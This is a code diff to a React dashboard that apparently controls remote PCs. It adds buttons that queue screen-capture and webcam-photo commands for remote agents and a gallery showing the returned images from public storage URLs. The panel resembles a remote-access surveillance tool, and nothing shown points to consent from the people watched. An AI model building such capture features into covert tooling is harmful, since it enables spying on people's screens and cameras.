@@ -99,7 +99,10 @@ export default function Dashboard() {
     return (now - last) < 15000; // 15 sec de tolérance (Heartbeat = 5s)
   };
 
-  const fetchScreenshots = async (pcName: string) => {
+  const [zoomedImage, setZoomedImage] = useState<string | null>(null);
+  const [isCapturing, setIsCapturing] = useState(false);
+
+  const fetchScreenshots = async (pcName: string, prefix: string) => {
     const safeName = pcName.replace(/[\/\\ :|]/g, '_');
     const { data } = await supabase.storage.from('kerchak-assets').list('', {
       limit: 20,
@@ -107,13 +110,29 @@ export default function Dashboard() {
       sortBy: { column: 'created_at', order: 'desc' },
     });
     if (data) {
-      const pcFiles = data.filter(f => f.name.startsWith(safeName));
+      const pcFiles = data.filter(f => f.name.startsWith(prefix + safeName));
       const urls = pcFiles.map(f => {
         const { data: urlData } = supabase.storage.from('kerchak-assets').getPublicUrl(f.name);
         return urlData.publicUrl;
       });
       setScreenshots(urls);
+      setIsCapturing(false);
     }
+  };
+
+  const requestCapture = async (type: 'ss' | 'webcam') => {
+    if (!selectedPc || !selectedPcName) return;
+    setIsCapturing(true);
+    setScreenshots([]);
+    
+    await supabase.from('commands').insert({
+      computer_id: selectedPc,
+      command: type,
+      args: "",
+      status: 'pending'
+    });
+    
+    setTimeout(() => fetchScreenshots(selectedPcName, type === 'ss' ? 'scr_' : 'webcam_'), 5000);
   };
 
   const sendCommand = async (pcId: string, pcName: string, cmd: string, args: string = "") => {
@@ -127,10 +146,7 @@ export default function Dashboard() {
       status: 'pending'
     });
 
-    if (cmd === 'ss' || cmd === 'webcam') {
-      setActiveModal('screenshot');
-      setTimeout(() => fetchScreenshots(pcName), 5000);
-    } else if (cmd === 'chat_open') {
+    if (cmd === 'chat_open') {
       setActiveModal('chat');
     }
   };
@@ -292,8 +308,8 @@ export default function Dashboard() {
                 </div>
               </div>
               <div className="grid grid-cols-4 gap-2">
-                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'ss')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-blue-400 transition-colors" title="Screenshot"><Camera size={18} /></button>
-                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'webcam')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-purple-400 transition-colors" title="Webcam"><Monitor size={18} /></button>
+                <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setScreenshots([]); setActiveModal('screenshot'); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-blue-400 transition-colors" title="Screenshots"><Monitor size={18} /></button>
+                <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setScreenshots([]); setActiveModal('webcam'); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-purple-400 transition-colors" title="Webcams"><Camera size={18} /></button>
                 <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setShowVoice(true); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Discord Voice"><Mic size={18} /></button>
                 <button onClick={() => sendCommand(pc.id, pc.pc_name, 'chat_open')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-pink-400 transition-colors" title="Chat Box"><MessageSquare size={18} /></button>
 
@@ -306,22 +322,61 @@ export default function Dashboard() {
         ))}
       </div>
 
-      {activeModal === 'screenshot' && (
+      {(activeModal === 'screenshot' || activeModal === 'webcam') && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
           <div className="bg-[#111] border border-white/10 rounded-xl overflow-hidden w-full max-w-5xl shadow-2xl">
             <div className="flex justify-between items-center p-4 border-b border-white/10 bg-black/50">
-              <h3 className="font-bold flex items-center gap-2"><Camera size={18} /> Captures</h3>
-              <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white"><X size={20} /></button>
+              <h3 className="font-bold flex items-center gap-2 text-white">
+                {activeModal === 'screenshot' ? <><Monitor className="text-blue-400" size={18} /> Monitor Captures - {selectedPcName}</> : <><Camera className="text-purple-400" size={18} /> Webcam Captures - {selectedPcName}</>}
+              </h3>
+              <div className="flex gap-4 items-center">
+                <button 
+                  onClick={() => requestCapture(activeModal)} 
+                  disabled={isCapturing}
+                  className="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded-lg font-bold text-sm disabled:opacity-50 flex items-center gap-2"
+                >
+                  {isCapturing ? <RefreshCw size={16} className="animate-spin" /> : <Camera size={16} />}
+                  {activeModal === 'screenshot' ? 'Capture Screens' : 'Take Photo'}
+                </button>
+                <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white"><X size={20} /></button>
+              </div>
             </div>
-            <div className="p-4 flex gap-4 overflow-x-auto min-h-[300px] items-center justify-center">
-              {screenshots.length > 0 ? (
+            <div className="p-6 flex flex-wrap gap-6 overflow-y-auto max-h-[70vh] items-center justify-center bg-[#0a0a0c]">
+              {isCapturing ? (
+                <div className="flex flex-col items-center gap-4 py-20">
+                  <RefreshCw size={32} className="animate-spin text-blue-500" />
+                  <span className="text-gray-400 font-medium tracking-wide animate-pulse">Capturing {activeModal === 'screenshot' ? 'Screens' : 'Webcams'}...</span>
+                </div>
+              ) : screenshots.length > 0 ? (
                 screenshots.map((url, i) => (
-                  <img key={i} src={url} className="max-h-[70vh] rounded-lg border border-white/10 shadow-2xl" alt="PC Screenshot" />
+                  <div key={i} className="relative group">
+                    <img 
+                      src={url} 
+                      onClick={() => setZoomedImage(url)}
+                      className="max-h-[300px] cursor-pointer group-hover:border-blue-500 transition-all rounded-lg border-2 border-white/10 shadow-2xl object-contain bg-black" 
+                      alt={`Capture ${i}`} 
+                    />
+                    <div className="absolute top-2 right-2 bg-black/70 text-white text-xs px-2 py-1 rounded backdrop-blur-sm pointer-events-none">
+                      {activeModal === 'screenshot' ? `Screen ${i+1}` : `Cam ${i+1}`}
+                    </div>
+                  </div>
                 ))
               ) : (
-                <span className="text-gray-500 animate-pulse">Waiting for agent to upload image...</span>
+                <div className="text-gray-500 py-20 flex flex-col items-center gap-3">
+                  <Camera size={40} className="opacity-20" />
+                  <span>Click the capture button to take a photo.</span>
+                </div>
               )}
             </div>
+          </div>
+        </div>
+      )}
+
+      {zoomedImage && (
+        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/95 p-4 cursor-pointer backdrop-blur-md" onClick={() => setZoomedImage(null)}>
+          <img src={zoomedImage} className="max-w-[95vw] max-h-[95vh] rounded-lg shadow-[0_0_50px_rgba(0,0,0,0.5)] object-contain border border-white/10" alt="Zoomed Capture" />
+          <div className="absolute top-6 right-6 text-white bg-white/10 p-2 rounded-full hover:bg-white/20 transition-colors">
+            <X size={24} />
           </div>
         </div>
       )}
